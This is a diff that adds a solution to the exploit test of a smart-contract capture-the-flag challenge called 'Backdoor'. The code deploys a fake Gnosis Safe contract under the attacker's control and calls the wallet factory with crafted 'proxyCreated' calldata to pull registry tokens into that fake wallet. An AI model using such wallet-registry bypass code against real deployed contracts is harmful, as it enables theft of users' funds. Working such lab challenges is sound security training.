@@ -37,6 +37,24 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let fakesafe = await (await ethers.getContractFactory('FakeGnosisSafe', attacker)).deploy();
+        await fakesafe.setOwner(users[0]);
+        
+        console.log('balance before', (await this.token.balanceOf(fakesafe.address)).toNumber());
+        
+        let tx = await this.walletFactory.createProxy(
+            fakesafe.address,
+            this.walletRegistry.interface.encodeFunctionData(
+                'proxyCreated',
+                [
+                    fakesafe.address,
+                    this.masterCopy.address,
+                    this.masterCopy.interface.getSighash("setup"),
+                    3
+                ]
+            )
+        );
+        console.log('balance after', (await this.token.balanceOf(fakesafe.address)).toNumber());
     });
 
     after(async function () {
